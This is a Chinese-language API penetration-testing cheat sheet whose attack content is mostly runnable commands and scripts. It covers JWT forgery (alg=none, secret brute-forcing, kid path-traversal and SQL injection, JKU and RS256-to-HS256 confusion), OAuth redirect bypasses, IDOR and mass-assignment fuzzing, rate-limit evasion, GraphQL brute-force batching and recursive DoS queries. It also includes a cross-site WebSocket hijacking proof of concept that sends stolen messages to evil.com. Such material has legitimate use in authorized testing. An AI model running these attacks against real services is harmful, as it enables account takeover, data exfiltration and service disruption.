# API 安全测试实战参考

> 覆盖: JWT攻击 → OAuth/OIDC → REST API Fuzzing → WebSocket → gRPC → 速率限制 → OpenAPI泄露 → GraphQL深入
> 与 SecSkills-main 互补: 该技能覆盖 SQLi/XSS/RCE 等传统 Web 漏洞，本文件覆盖 API 专有攻击面

---

## 1. JWT 攻击

### 1.1 JWT 结构速查

```
Header:    {"alg":"HS256","typ":"JWT"}
Payload:   {"sub":"admin","iat":1516239022}
Signature: HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)

完整 Token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.d9s8d9f8sdf8sd9f8sdf
```

### 1.2 alg=None 攻击

```bash
# 1. 解码 JWT (base64解码)
echo 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0' | base64 -d

# 2. 修改 header 为 alg: none
# Header: {"alg":"none","typ":"JWT"}
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
# Payload: {"sub":"admin","iat":1516239022}
# Signature: (空)
# 完整: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.

# 3. 自动化: jwt_tool
python3 jwt_tool.py <TOKEN> -X a
python3 jwt_tool.py <TOKEN> -X n    # 尝试多种 none 变体

# 4. Python 快速生成
python3 -c "
import base64, json
h = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps({'sub':'admin','iat':1516239022}).encode()).rstrip(b'=').decode()
print(f'{h}.{p}.')
"
```

### 1.3 弱密钥爆破 (HMAC)

```bash
# jwt_tool 模式爆破
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# hashcat 爆破 HMAC-SHA256
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt

# Python jwt 库验证
pip install pyjwt 2>/dev/null
python3 -c "
import jwt, sys
token = '<TOKEN>'
with open('/usr/share/wordlists/rockyou.txt', 'r', errors='ignore') as f:
    for line in f:
        key = line.strip()
        try:
            decoded = jwt.decode(token, key, algorithms=['HS256'])
            print(f'KEY FOUND: {key}')
            print(decoded)
            break
        except:
            continue
"
```

### 1.4 Kid 注入攻击

```bash
# Kid (Key ID) 是 JWT header 中的可选字段，用于指定密钥来源
# 攻击1: kid -> 目录遍历读文件
# Header: {"alg":"HS256","typ":"JWT","kid":"../../../../etc/passwd"}
# 如果后端用 kid 值作为文件路径读取密钥，可读取任意文件

# 攻击2: kid -> SQL 注入
# Header: {"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'secret' -- "}

# 攻击3: kid -> OS 命令注入 (极少数情况)
# Header: {"alg":"HS256","typ":"JWT","kid":"$(cat /etc/passwd)"}

# Python 生成 kid 注入 JWT
python3 -c "
import jwt, json
payload = {'sub':'admin','iat':1516239022}
headers = {'alg':'HS256','typ':'JWT','kid':'../../../../etc/passwd'}
# 如果 kid 指向的文件内容为空或可预测，用空密钥签名
token = jwt.encode(payload, '', algorithm='HS256', headers=headers)
print(token)
"
```

### 1.5 JKU / JWK 注入

```bash
# JKU (JWK Set URL) - 指定 JWK 获取地址
# 攻击: 控制 JKU 指向自己的 VPS，返回自己生成的公钥
# 1. 生成自己的 RSA 密钥对
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# 2. 从公钥提取 JWK
python3 -c "
from cryptography.hazmat.primitives import serialization
from jwcrypto import jwk
with open('public.pem', 'rb') as f:
    key = jwk.JWK.from_pem(f.read())
print(key.export(private_key=False))
"

# 3. 用私钥签名 JWT，header 中指定 jku 指向自己的服务器
# 4. 在 VPS 上放 jwks.json 包含攻击者公钥
```

### 1.6 密钥混淆攻击 (RS256 → HS256)

```bash
# 如果服务端期望 RS256 (非对称)，但接受 HS256 (对称)
# 并且攻击者能拿到公钥: 用公钥作为 HS256 的 secret 签名
# 服务端验证时用公钥作为 HMAC 密钥验证，通过

python3 -c "
import jwt
# 获取服务端公钥 (通常从 /jwks.json, /.well-known/jwks.json)
public_key = open('public.pem').read()
token = jwt.encode({'sub':'admin'}, public_key, algorithm='HS256')
print(token)
"
```

---

## 2. OAuth 2.0 / OIDC 配置错误

### 2.1 Redirect URI 绕过

```bash
# 常见的 redirect_uri 绕过技巧
# .../callback         → .../callback.evil.com
# .../callback         → .../callback/evil.com
# .../callback         → .../callback?evil.com
# .../callback         → .../callback#evil.com
# .../evil.com/callback

# 开放重定向: redirect_uri 接受任意 URL
# 构造: https://app.com/oauth/callback?redirect_uri=https://evil.com/steal
```

### 2.2 CSRF + 授权码拦截

```bash
# OAuth 流程缺少 state 参数 → CSRF 攻击
# 攻击者构造:
<a href="https://app.com/oauth/authorize?client_id=xxx&redirect_uri=https://app.com/callback&response_type=code&state=">
  点击登录
</a>

# 用户点击后授权攻击者的账号绑定到受害者账号
# 检测: 抓 OAuth 请求看是否有不可预测的 state 参数
```

### 2.3 Implicit Grant 令牌泄露

```bash
# Implicit Flow 令牌在 URL fragment (#) 中
# 检测:
# 1. 历史记录是否保存了 #access_token=xxx
# 2. Referer header 是否泄露 token
# 3. Service Worker 是否能截取 fragment

# 利用: 如果应用日志/错误页面记录了完整 URL，可泄露 access_token
```

### 2.4 弱 Client Secret / 公开 Client Secret

```bash
# 前端/APK 中硬编码的 client_secret
grep -r "client_secret" app.apk 2>/dev/null
grep -r "client_secret\|client-id\|client_id" --include="*.js" --include="*.html" .

# 利用泄露的 client_secret 刷新 token
curl -X POST https://auth.example.com/oauth/token \
  -d "grant_type=refresh_token&refresh_token=<REFRESH>&client_id=<ID>&client_secret=<SECRET>"
```

### 2.5 OIDC UserInfo 端点未授权

```bash
# 检测 UserInfo 端点能否直接访问
curl -H "Authorization: Bearer <ANY_VALID_TOKEN>" https://app.com/userinfo
curl -H "Authorization: Bearer " https://app.com/userinfo
curl https://app.com/userinfo
```

---

## 3. REST API Fuzzing

### 3.1 HTTP 方法滥用

```bash
# 方法覆盖检测
curl -X OPTIONS https://<target>/api/users -v
curl -X PUT https://<target>/api/users/1
curl -X PATCH https://<target>/api/users/1
curl -X DELETE https://<target>/api/users/1

# 批量测试
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE CONNECT; do
  echo "=== $method ==="
  curl -X $method https://<target>/api/users -s -o /dev/null -w "%{http_code}"
  echo
done

# X-HTTP-Method-Override 绕过
curl -X GET https://<target>/api/users/1 -H "X-HTTP-Method-Override: DELETE"
curl -X POST https://<target>/api/users/1 -H "X-HTTP-Method-Override: PATCH"
```

### 3.2 参数篡改基础

```bash
# ID 遍历 → 越权
curl https://<target>/api/users/1
curl https://<target>/api/users/2
curl https://<target>/api/users/100

# UUID 可预测
curl https://<target>/api/users/00000000-0000-0000-0000-000000000001

# 批量参数注入
curl 'https://<target>/api/users?page=1&limit=10'
curl 'https://<target>/api/users?page=1&limit=1000000'
curl 'https://<target>/api/users?page=-1&limit=10'
curl 'https://<target>/api/users?page[]=1&limit=10'  # PHP 数组注入

# 批量 ID 注入 (IDOR)
curl 'https://<target>/api/users?id=1,2,3,4,5'
curl 'https://<target>/api/users?id[]=1&id[]=2&id[]=3'
```

### 3.3 JSON/XML 注入

```bash
# JSON 内容类型混淆
curl -X POST https://<target>/api/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin"}'

curl -X POST https://<target>/api/users \
  -H "Content-Type: application/xml" \
  -d '<user><name>test</name><role>admin</role></user>'

# JSON 键冲突
curl -X POST https://<target>/api/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test","name":"admin"}'

# JSON Schema 绕过 - 额外字段
curl -X POST https://<target>/api/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test","__proto__":{"isAdmin":true},"constructor":{"prototype":{"isAdmin":true}}}'

# Content-Type 绕过 (JSON 扩展名)
curl -X POST https://<target>/api/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin"}'
```

### 3.4 Mass Assignment (批量赋值)

```bash
# 检测 extra 字段是否被接受
curl -X POST https://<target>/api/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test","is_admin":true,"role":"admin","balance":9999999,"verified":true}'

# 常见敏感字段字典
is_admin, role, admin, verified, email_verified, balance, credit, 
permissions, group, groups, roles, user_type, account_type, 
status, is_active, is_approved, is_trusted, premium, vip
```

---

## 4. WebSocket 劫持 / CSWSH

### 4.1 CSWSH (Cross-Site WebSocket Hijacking)

```bash
# 原理: WebSocket 建立时浏览器自动携带 Cookie
# 如果服务端不验证 Origin，攻击者网站可建立 WS 连接

# 检测: 截获 WebSocket 握手请求，检查 Origin 头
# 服务端验证: 用 curl 测试
curl -v -H "Origin: https://evil.com" \
  -H "Cookie: session=<YOUR_COOKIE>" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  https://<target>/ws

# PoC HTML
cat > ws-poc.html << 'EOF'
<html><body><script>
const ws = new WebSocket('wss://<target>/ws');
ws.onopen = function(e) { ws.send('{"action":"get_users"}'); };
ws.onmessage = function(e) { fetch('https://evil.com/steal?data=' + btoa(e.data)); };
</script></body></html>
EOF
```

### 4.2 WebSocket 消息注入

```bash
# 如果 WebSocket 消息作为后端命令
ws.send('{"cmd":"exec","args":"id"}')
ws.send('{"cmd":"read","path":"../../../../etc/passwd"}')
ws.send('{"type":"subscribe","channel":"admin_events"}')

# WS 消息格式混淆
ws.send('["admin","get_users"]')
ws.send('admin::get_users')
ws.send('{"cmd":"admin.get_users"}')

# WS 协议降级
# 如果后端支持 JSON 和 MsgPack，尝试格式混淆
```

### 4.3 WebSocket 嗅探

```bash
# 使用 wscat / websocat 连接测试
wscat -c wss://<target>/ws

# Python 客户端
python3 -c "
import asyncio, websockets
async def test():
    async with websockets.connect('wss://<target>/ws') as ws:
        print(await ws.recv())  # 看服务器推送了什么
        await ws.send('{\"action\":\"ping\"}')
        print(await ws.recv())
asyncio.run(test())
"
```

---

## 5. gRPC 反射攻击

### 5.1 检测 gRPC 服务

```bash
# gRPC 通常通过 HTTP/2 暴露
# 检测: 协议协商
curl -v --http2 https://<target>:<port> 2>&1 | grep -i "grpc\|h2c"

# Content-Type: application/grpc
curl -v https://<target>:<port>/package.Service/Method \
  -H "Content-Type: application/grpc" 2>&1

# gRPC 反射 API 检测
grpcurl -plaintext <target>:<port> list
```

### 5.2 枚举服务和方法

```bash
# 列出所有服务
grpcurl <target>:<port> list

# 列出服务方法
grpcurl <target>:<port> list <package.Service>

# 查看方法描述
grpcurl <target>:<port> describe <package.Service.Method>

# 调用方法
grpcurl -d '{"field":"value"}' <target>:<port> <package.Service>/<Method>

# 无反射时暴力猜服务名
for svc in greeter Greeter Hello HelloService User UserService Auth AuthService Admin; do
  echo "Trying $svc..."
  grpcurl -plaintext <target>:<port> list $svc 2>/dev/null && echo "FOUND: $svc"
done
```

### 5.3 gRPC Web 转换

```bash
# gRPC-Web 通常通过 HTTP/1.1 暴露
curl -X POST https://<target>/package.Service/Method \
  -H "Content-Type: application/grpc-web+proto" \
  -H "X-Grpc-Web: 1" \
  --data-binary @payload.bin
```

---

## 6. API 速率限制绕过

```bash
# 1. IP 轮换
# X-Forwarded-For 伪造
curl -H "X-Forwarded-For: 1.1.1.1" ...
curl -H "X-Forwarded-For: 1.1.1.2" ...
curl -H "X-Real-IP: 1.1.1.3" ...
curl -H "X-Originating-IP: 1.1.1.4" ...
curl -H "Client-IP: 1.1.1.5" ...

# 2. 多值 X-Forwarded-For
curl -H "X-Forwarded-For: 127.0.0.1, 1.1.1.1" ...

# 3. 请求分片 (分块发送)
for i in $(seq 1 1000); do
  curl -s "https://<target>/api/check?username=user$i" &
  sleep 0.1
done

# 4. HTTP/2 多路复用 (同一个 TCP 连接发多个请求)
# 5. 无 Cookie / 无 Session 请求 (绕过 per-session 限制)
# 6. 修改 User-Agent (per-Agent 限制绕过)
```

---

## 7. Swagger / OpenAPI 文档泄露

### 7.1 常见路径

```bash
# 常用 OpenAPI 端点
/api/docs
/api/swagger
/api/swagger-ui.html
/api/v1/swagger-ui.html
/api/v2/swagger-ui.html
/api/openapi.json
/api/swagger.json
/api/v1/api-docs
/api/v2/api-docs
/swagger-resources
/swagger-ui.html
/swagger/index.html
/v1/swagger.json
/v2/swagger.json
/api/schema
/api/spec
/docs/swagger.json
/.well-known/openid-configuration

# 批量测试
for path in /api/docs /api/swagger /api/openapi.json /api/swagger.json /swagger-ui.html; do
  status=$(curl -s -o /dev/null -w "%{http_code}" https://<target>$path)
  echo "$path → $status"
done
```

### 7.2 从文档提取 API 端点

```bash
# 下载并解析
curl -s https://<target>/api/openapi.json | python3 -c "
import json, sys
doc = json.load(sys.stdin)
for path, methods in doc.get('paths', {}).items():
    for method in methods:
        print(f'{method.upper()} {path}')
"

# 从 HTML 中提取
curl -s https://<target>/swagger-ui.html | grep -oP 'url:\s*["\x27]([^"\x27]+)["\x27]'
```

---

## 8. GraphQL 深入攻击

### 8.1 内省查询

```graphql
# 基础内省
query { __schema { types { name fields { name type { name } } } } }

# 查询所有 mutation
query { __schema { mutationType { fields { name args { name type { name } } } } } }

# 查询所有 subscription
query { __schema { subscriptionType { fields { name } } } }
```

### 8.2 批处理攻击 (Batching)

```graphql
# 批量密码猜测 — 一次请求尝试多个密码
mutation {
  a: login(username:"admin", password:"123456") { success }
  b: login(username:"admin", password:"password") { success }
  c: login(username:"admin", password:"admin123") { success }
  d: login(username:"admin", password:"qwerty") { success }
  # ... 一次请求试几十个密码
}
```

### 8.3 深度递归 DoS

```graphql
# 递归查询导致服务端 DoS
query deep {
  user(id: 1) {
    friends { user { friends { user { friends { user { friends { name } } } } } } }
  }
}

# 别名递归 (消耗解析器)
query {
  a1: __typename
  a2: __typename
  # ... 重复上千次
  a1000: __typename
}
```

### 8.4 GraphQL 绕过

```bash
# GET 请求也可执行 GraphQL 查询
curl -X GET 'https://<target>/graphql?query=query{__typename}'

# HTTP 头注入
curl -X POST https://<target>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{types{name}}}"}'

curl -X POST https://<target>/graphql \
  -H "Content-Type: application/graphql" \
  -d 'query{__schema{types{name}}}'

# 批量 alias 注入
curl -X POST https://<target>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { a: __typename b: __typename c: __typename }"}'
```

---

## 速查表

| 攻击类型 | 检测命令 | 预期结果 |
|---------|----------|---------|
| JWT alg=none | `jwt_tool <TOKEN> -X a` | 返回 200 |
| JWT 弱密钥 | `jwt_tool <TOKEN> -C -d wordlist.txt` | 找到密钥 |
| JWT kid 注入 | 修改 header kid 为 `../../../../etc/passwd` | 返回 passwd 内容 |
| OAuth redirect 绕过 | 修改 redirect_uri 为攻击者域名 | 重定向到攻击者 |
| CSWSH | 无 Origin 验证的 WS | 攻击者网站可建 WS |
| gRPC 反射 | `grpcurl list` | 返回服务列表 |
| Mass Assignment | POST `{"is_admin":true}` | 权限提升 |
| OpenAPI 泄露 | 检测 `/api/openapi.json` | 200 返回|

---

*参考: jwt.io, portswigger.net, graphql.org | 与 SecSkills-main 互补，不重复传统 Web 漏洞*
